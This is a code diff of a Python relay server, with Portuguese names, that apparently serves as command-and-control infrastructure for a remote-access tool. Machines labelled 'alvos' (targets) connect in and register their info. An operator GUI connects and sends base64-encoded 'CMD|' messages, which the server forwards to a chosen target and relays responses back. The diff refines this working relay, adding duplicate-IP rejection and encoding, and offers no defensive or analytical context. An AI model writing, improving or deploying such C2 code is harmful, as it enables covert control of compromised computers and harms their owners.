@@ -1,105 +1,82 @@
-import socket, os, threading
+import socket, os, threading, base64
 from chave import enviar_msg, receber_msg
 
 HOST = "0.0.0.0"
 PORTA = int(os.environ.get("PORT", 9001))
 
-# Guarda conexões: alvo_id -> socket
 alvos = {}
 gui_conn = None
 lock = threading.Lock()
-proximo_id = 1
+prox_id = 1
 
-def log(t):
-    print(f"[RELAY] {t}", flush=True)
+def log(m): print(f"[RELAY] {m}", flush=True)
 
-def tratar_alvo(conn, addr, aid):
-    global gui_conn
+def enviar_gui(texto):
+    with lock:
+        if not gui_conn: return
+        try: enviar_msg(gui_conn, texto)
+        except Exception as e: log(f"ERRO ENVIO GUI: {e}")
+
+def tratar_alvo(conn, addr, aid, info):
+    ip = addr[0]
+    with lock:
+        for existente in alvos.values():
+            if existente["ip"] == ip:
+                log(f"DUPLICATA {ip} — FECHANDO")
+                conn.close()
+                return
+        alvos[aid] = {"conn": conn, "ip": ip, "info": info}
     try:
-        info = receber_msg(conn, timeout=8) or "?"
-        with lock:
-            alvos[aid] = {"conn": conn, "ip": addr[0], "info": info}
-        log(f"ALVO {aid} conectado: {info}")
-        # Avisa GUI se tiver conectada
-        with lock:
-            if gui_conn:
-                try: enviar_msg(gui_conn, f"NOVO_ALVO|{aid}|{addr[0]}|{info}")
-                except: pass
-        # Só repassa tudo para a GUI
+        log(f"ALVO {aid} CONECTADO: {info}")
+        enviar_gui(f"NOVO_ALVO|{aid}|{ip}|{info}")
         while True:
-            dados = conn.recv(65536)
+            dados = receber_msg(conn, raw=True)
             if not dados: break
-            with lock:
-                if gui_conn:
-                    try: gui_conn.sendall(dados)
-                    except: pass
-    except Exception as e:
-        log(f"alvo {aid} caiu: {e}")
+            enviar_gui(f"RESPOSTA|{aid}|{base64.b64encode(dados).decode()}")
     finally:
         with lock: alvos.pop(aid, None)
-        try: conn.close()
-        except: pass
+        enviar_gui(f"SAIU_ALVO|{aid}")
+        conn.close()
 
 def tratar_gui(conn, addr):
     global gui_conn
+    with lock: gui_conn = conn
+    log("GUI CONECTADA")
+    enviar_msg(conn, "OK_GUI")
     with lock:
-        # Desconecta GUI anterior se houver
-        if gui_conn:
-            try: gui_conn.close()
-            except: pass
-        gui_conn = conn
-    log(f"GUI conectada de {addr[0]}")
-    try:
-        # Envia lista inicial de alvos
+        for aid, d in alvos.items():
+            enviar_msg(conn, f"NOVO_ALVO|{aid}|{d['ip']}|{d['info']}")
+    while True:
+        txt = receber_msg(conn)
+        if not txt: break
+        if not txt.startswith("CMD|"): continue
+        _, aid_b, dados_b64 = txt.split("|", 2)
+        aid = int(aid_b)
+        dados = base64.b64decode(dados_b64)
         with lock:
-            for aid, d in alvos.items():
-                enviar_msg(conn, f"NOVO_ALVO|{aid}|{d['ip']}|{d['info']}")
-        # Repassa tudo da GUI para o alvo selecionado
-        while True:
-            dados = conn.recv(65536)
-            if not dados: break
-            # Formato: ALVO|12|<dados criptografados>
-            if dados.startswith(b"ALVO|"):
-                partes = dados.split(b"|", 2)
-                if len(partes) == 3:
-                    aid = int(partes[1])
-                    with lock:
-                        a = alvos.get(aid)
-                    if a:
-                        try: a["conn"].sendall(partes[2])
-                        except: pass
-    except Exception as e:
-        log(f"gui caiu: {e}")
-    finally:
-        with lock:
-            if gui_conn is conn:
-                gui_conn = None
-        try: conn.close()
-        except: pass
+            if aid in alvos:
+                alvos[aid]["conn"].sendall(dados)
 
 def main():
-    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv = socket.socket()
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind((HOST, PORTA))
-    srv.listen(50)
-    log(f"RELAY RAILWAY ouvindo em {HOST}:{PORTA}")
+    srv.listen(10)
+    log(f"OUVINDO NA PORTA {PORTA}")
     while True:
         conn, addr = srv.accept()
-        # Primeira mensagem diz quem é
         try:
-            conn.settimeout(5)
-            primeiro = receber_msg(conn, timeout=4)
+            conn.settimeout(3)
+            prim = receber_msg(conn)
             conn.settimeout(None)
-        except Exception:
-            primeiro = None
-        if primeiro == "EU_SOU_GUI":
-            threading.Thread(target=tratar_gui, args=(conn,addr), daemon=True).start()
-        else:
-            # É alvo — usa o que ele enviou como info
-            global proximo_id
-            aid = proximo_id
-            proximo_id += 1
-            threading.Thread(target=tratar_alvo, args=(conn,addr,aid), daemon=True).start()
+            if prim == "SOU_GUI":
+                threading.Thread(target=tratar_gui, args=(conn, addr), daemon=True).start()
+            else:
+                global prox_id
+                aid = prox_id; prox_id += 1
+                threading.Thread(target=tratar_alvo, args=(conn, addr, aid, prim), daemon=True).start()
+        except Exception as e:
+            log(f"CONEXAO REJEITADA: {e}")
+            conn.close()
 
-if __name__ == "__main__":
-    main()
+if __name__ == "__main__": main()
